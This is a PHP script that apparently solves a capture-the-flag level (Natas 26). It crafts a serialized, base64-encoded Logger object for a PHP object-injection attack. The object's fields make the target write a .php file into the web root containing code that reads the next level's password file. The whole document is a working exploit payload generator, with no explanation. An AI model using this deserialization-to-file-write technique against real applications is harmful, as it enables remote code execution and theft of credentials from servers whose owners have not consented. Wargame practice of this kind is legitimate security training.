<?php

class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct(){
            // initialise variables
            $this->initMsg="hi";
            $this->exitMsg="<?php readfile('/etc/natas_webpass/natas27'); ?>\n";
            $this->logFile = "/var/www/natas/natas26/img/cock.php";
            }
}

$o = new Logger();
print base64_encode(serialize($o))."\n";
?>
